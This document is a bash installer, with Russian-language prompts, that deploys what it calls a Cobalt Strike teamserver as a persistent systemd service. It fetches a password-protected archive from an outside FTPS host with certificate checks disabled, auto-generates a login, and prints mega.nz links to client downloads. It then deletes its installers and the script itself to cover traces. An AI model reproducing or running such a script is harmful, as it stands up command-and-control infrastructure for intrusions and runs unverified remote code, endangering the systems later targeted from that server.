#!/bin/bash
echo "==============================================="
echo -en "${LGREEN}Centos 7 / Ubuntu Server 18 only${BREAK}\n"
echo "==============================================="
if [ -n "$1" ]
then
    UNIQ=$1
else
    echo -en "Укажите ${LGREEN}пароль${BREAK}:" 
    read UNIQ
fi
export CURRENT_DIR=$PWD
export DIR="/opt"
export PROJECT="cs"
DEB_PACKAGE_NAME="wget unzip software-properties-common p7zip-full"
YUM_PACKAGE_NAME="wget unzip p7zip-full"
BOLD='\033[1m'       #  ${BOLD}
LGREEN='\033[1;32m'     #  ${LGREEN}
LBLUE='\033[1;34m'     #  ${LBLUE}
BGGREEN='\033[42m'     #  ${BGGREEN}
BGGRAY='\033[47m'     #  ${BGGRAY}
BREAK='\033[m'       #  ${BREAK}
regex='^[0-9]+$'
if cat /etc/*release | grep ^NAME | grep CentOS; then
    echo "==============================================="
    echo "Installing packages $YUM_PACKAGE_NAME on CentOS"
    echo "==============================================="
    yum install -y $YUM_PACKAGE_NAME
    OS="CentOS"
 elif cat /etc/*release | grep ^NAME | grep Red; then
    echo "==============================================="
    echo "Installing packages $YUM_PACKAGE_NAME on RedHat"
    echo "==============================================="
    yum install -y $YUM_PACKAGE_NAME
    OS="Redhat"
 elif cat /etc/*release | grep ^NAME | grep Fedora; then
    echo "================================================"
    echo "Installing packages $YUM_PACKAGE_NAME on Fedora"
    echo "================================================"
    yum install -y $YUM_PACKAGE_NAME
    OS="Fedora"
 elif cat /etc/*release | grep ^CentOS; then
    echo "================================================"
    echo "Installing packages $YUM_PACKAGE_NAME on Fedora"
    echo "================================================"
    OS="CentOS6"
    yum install -y $YUM_PACKAGE_NAME
 elif cat /etc/*release | grep ^NAME | grep Ubuntu; then
    echo "==============================================="
    echo "Installing packages $DEB_PACKAGE_NAME on Ubuntu"
    echo "==============================================="
    apt-get update
    apt-get install -y $DEB_PACKAGE_NAME
    OS="Ubuntu"
 elif cat /etc/*release | grep ^NAME | grep Debian ; then
    echo "==============================================="
    echo "Installing packages $DEB_PACKAGE_NAME on Debian"
    echo "==============================================="
    apt-get update
    apt-get install -y $DEB_PACKAGE_NAME
    OS="Debian"
 elif cat /etc/*release | grep ^NAME | grep Mint ; then
    echo "============================================="
    echo "Installing packages $DEB_PACKAGE_NAME on Mint"
    echo "============================================="
    apt-get update
    apt-get install -y $DEB_PACKAGE_NAME
    OS="Mint"
 elif cat /etc/*release | grep ^NAME | grep Knoppix ; then
    echo "================================================="
    echo "Installing packages $DEB_PACKAGE_NAME on Kanoppix"
    echo "================================================="
    apt-get update
    apt-get install -y $DEB_PACKAGE_NAME
    OS="Knoppix"
 else
    echo "OS NOT DETECTED, couldn't install package $PACKAGE"
    exit 1;
 fi

clear

echo -en "\n${BOLD} Script installed required packages${BREAK}\n\n"
rm -rf $DIR/$PROJECT

# CS
rm -d -r $DIR/$PROJECT &>/dev/null
wget --no-check-certificate --directory-prefix=$DIR/ --no-cache --ftp-user=$PROJECT --ftp-password=$UNIQ ftps://sip.mybot.work:21/server4.zip
# unzip -P $UNIQ $DIR/server4.zip -d $DIR/$PROJECT
7z e -p$UNIQ $DIR/server4.zip -o$DIR/$PROJECT
if [[ "${OS}" == "CentOS" ]]; then
    rpm -i $DIR/$PROJECT/jre-8u121-linux-x64.rpm
  elif [[ "${OS}" == "Ubuntu" ]]; then
    mkdir /usr/lib/jvm &>/dev/null
    tar -zxvf $DIR/$PROJECT/jdk-8u121-linux-x64.tar.gz -C /usr/lib/jvm/
    update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_121/bin/java 3
    update-alternatives --config java
    # add-apt-repository ppa:openjdk-r/ppa && sudo apt-get update -q && sudo apt install -y openjdk-11-jdk
    # update-java-alternatives -s java-1.11.0-openjdk-amd64
fi

chmod +x $DIR/$PROJECT/teamserver

# Generate Password
PASSWD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)

#Obtain IP
IP=$(wget --timeout=1 --tries=1 -qO- ipinfo.io/ip)
if [[ "${IP}" = "" ]]; then
    IP=$(wget --timeout=1 --tries=1 -qO- ipecho.net/plain)
fi
if [[ "${IP}" = "" ]]; then
    IP=$(wget --timeout=1 --tries=1 -qO- icanhazip.com)
fi
if [[ "${IP}" = "" ]]; then
    IP=$(wget --timeout=1 --tries=1 -qO- ident.me)
fi

echo "[Unit]
Description=$PROJECT
After=network.target
[Service]
WorkingDirectory=/opt/$PROJECT
ExecStart=$DIR/$PROJECT/teamserver $IP $PASSWD
Restart=on-failure
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=$PROJECT
OOMScoreAdjust=-100
[Install]

WantedBy=multi-user.target" > /etc/systemd/system/$PROJECT.service
systemctl daemon-reload
systemctl enable $PROJECT
systemctl restart $PROJECT

# Clear
echo -e  "===================================\n"
echo -en "${LGREEN}Install Complete!${BREAK}\n"
echo -en "Для подключения:\n"
echo -en "${LBLUE}LINUX${BREAK}: Скачайте клиент по ссылке https://mega.nz/#!8mYR3ABa!8u6-QpJxARxOKVvwhHnepUYnaVGV8mt3UHjVcMpounU\n"
echo -en "Откройте терминал, перейдите в папку куда скачали клиент, и запустите строку: ./cobaltstrike\n"
echo -en "В появившемся окне клиента укажите Host: ${BOLD}$IP${BREAK}, Port: ${BOLD}50050${BREAK}, User: ${BOLD}ВАШ_НИК${BREAK} и Pasword: ${BOLD}$PASSWD${BREAK}\n\n"  
echo -en "${LBLUE}WINDOWS${BREAK}: Скачайте, установите Java (jre-*) и запустите cobaltstrike.bat файл\n"
echo -en "https://mega.nz/#!xnRlhagL!PqzVMj7vYPR_naoFHzs6EaPVoJ0aEKPB54XmkJy660o\n"
echo -en "В появившемся окне клиента укажите Host: ${BOLD}$IP${BREAK}, Port: ${BOLD}50050${BREAK}, User: ${BOLD}ВАШ_НИК${BREAK} и Pasword: ${BOLD}$PASSWD${BREAK}\n" 

# Erase project files
rm -f $DIR/$PROJECT/jre-8u121-linux-x64.rpm
rm -f $DIR/$PROJECT/jdk-8u121-linux-x64.tar.gz
rm -f $DIR/server4.zip

# Erase install script
rm -f $CURRENT_DIR/install4.sh

